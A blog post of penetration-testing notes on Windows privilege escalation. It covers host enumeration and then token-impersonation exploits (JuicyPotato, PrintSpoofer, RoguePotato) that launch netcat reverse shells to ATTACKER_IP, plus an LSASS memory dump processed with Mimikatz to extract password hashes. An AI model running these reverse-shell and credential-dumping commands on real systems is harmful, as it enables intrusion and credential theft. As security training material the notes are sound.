---
title: Notes | Windows Privilege Escalation
author: BatBato
date: 2022-09-02
categories: [Notes, Privilege Escalation, Windows_PE]
tags: [Web, Privilege Escalation, Windows, PE, Administrator]
permalink: /Notes/Privilege_Escalation/Windows_PE
---

# Windows Privilege Escalation

As with the Linux operating system, a misconfigured Windows machine can allow an attacker to gain ```Administrator``` or ```NT AUTHORITY\SYSTEM``` rights. While the ```Administrator``` is a user on any Windows machine, ```NT AUTHORITY\SYSTEM```, often called ```SYSTEM```, is an account that has the most rights but to which you cannot log in with credentials.

> For reading purpose, I won't tell if we are using a ```CMD``` console when running a command but will display a command that uses ```Powershell``` like ```PS> COMMAND```.
{: .prompt-danger }

## Network Information Gathering

### IPconfig

As for a Linux machine, we may want to check for the network of the machine. We can print information about its internet network with the command ```ipconfig``` :
```console
ipconfig /all
```
This will allow us to know if there is more than one network interface which can be leveraged to access a computer on a sub-network.

### ARP

We can use the ```arp``` command to check for other computers on the network like this :

```console
arp -a
```

### Routing Table

The routing table can show us what routes can packages take on the network :

```console
route print
```

### Netstat

The ```netstat``` command can show us if there is any service running on the machine that may be leveraged :

```console
netstat -ano
```

### Windows Defender & AppLocker Rules

To display information about ```Windows Defender``` or the ```AppLocker``` rules we can run the followinf commands :
```console
PS > Get-MpComputerStatus
```
```console
PS > Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Basic Enumeration

It's important to have information about the computer we are attacking. Like on Linux, we can, for example, list the running processes with the ```tasklist``` command :

```console
tasklist /svc
```

### System information

We can list environment variables with the ```set``` command. With the ```systeminfo``` we can get a lot of information about the computer we are in like the host name, the OS Version, the type of processor used...

To see if a machine is up to date, we can look to its ```hotfixes``` with the following command and by checking the Microsoft website:
```console
wmic qfe
```
or
```console
PS > Get-HotFix | ft -AutoSize
```

#### Program installed

We can check for non-standard applications that may have been installed by a user or an administrator :

```console
wmic product get name
```
or
```console
PS > Get-WmiObject -Class Win32_Product |  select Name, Version
```

#### RPC

A user can connect to a machine with the RPC protocol. We can look if another user is connected on our machine with the ```query user``` command. If you want to know how to impersonate this user check [this part of my blog](https://nouman404.github.io/Notes/Footprinting/Common_Services_Enumeration_&_Attacks#rdp-session-hijacking).

### Current User Privileges

When we arrive on a machine we may want to know which user we are or what are our rights. To check our user we can use the ```whoami``` or the ```echo %USERNAME%``` command. To see which rights our user has we can run the command ```whoami /priv``` and if we are a classic user we may get this output.

```console
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

> As you can see, we have some privileges that are disabled. You can enable them all using [this script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)
{: .prompt-tip }

We may want to check which group we are in because we can inherit privileges from certain.

```console
whoami /groups
```

We may also want to look for other users with the ```net user``` command or the list of all groups with this ```net localgroup``` command. To get information about a certain group you can use ```net localgroup GROUP_TO_CHECK```.


## Exploit User Rights

### SeImpersonate & SeAssignPrimaryToken

Every process in Windows has a token that contains details about the account that is operating it. Since these tokens are merely memory addresses that can be brute-forced by users who are unable to access memory, they are not thought of as secure resources. The ```SeImpersonate``` privilege is required to use the token. Only administrator accounts are granted access to it, and in most circumstances, it can be taken away during system hardening.

We are going to use [JuicyPotato](https://github.com/ohpe/juicy-potato) that can be used to exploit the ```SeImpersonate``` or ```SeAssignPrimaryToken``` privileges via DCOM/NTLM reflection abuse. Start a netcat listener on your attacker machine and then launch this command :

```console
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd" -t *
```

> You may get issues if you don't put the full path of a file.
{: .prompt-tip }

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

> If you are not running the exploit from a running process like an SQL server. You may need to add the ```-c``` flag. The add a value, depending on the machine you are on, from [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md). If the first value doesn't work try the second, then the third... until it works.
{: .prompt-warning }

Where [JuicyPotato](https://github.com/ohpe/juicy-potato) doen't work ```Windows Server 2019``` and ```Windows 10 build 1809``` onwards, [RoguePotato](https://github.com/antonioCoco/RoguePotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) do work.

```console
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd"
```

or

```console
c:\tools\RoguePotato.exe -r ATTACKER_IP -e "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd" -l LISTENING_PORT
```

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

### SeDebugPrivilege

Instead of adding the account to the administrators group, a user may be given the ```SeDebugPrivilege``` to run a specific program or service or help with troubleshooting. To leverage this privilege we can dump process memory. The ```Local Security Authority Subsystem Service``` (LSASS) process is a good target. We can do it with the GUI or with the command line. With the GUI, you will need to launch the ```Task Manager```, go to the ```Details``` section and find the ```lsass.exe``` process. When found, you can right click on it and select ```Create dump file```. The command for the command line is :

```console
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Now that we have the lsass dump (```lsass.dmp```), we can run [Mimikatz](https://www.kali.org/tools/mimikatz/) (you can also use the [github repo](https://github.com/ParrotSec/mimikatz)).

```console
mimikatz.exe
```

When on Mimikatz, we will try to dump password hashes :

```console
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
<SNIP>
Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : bob
Domain            : WIN-TEST
Logon Server      : WIN-TEST
Logon Time        : 9/2/2022 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : bob
         * Domain   : WIN-TEST
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
<SNIP>
```


### SeTakeOwnershipPrivilege




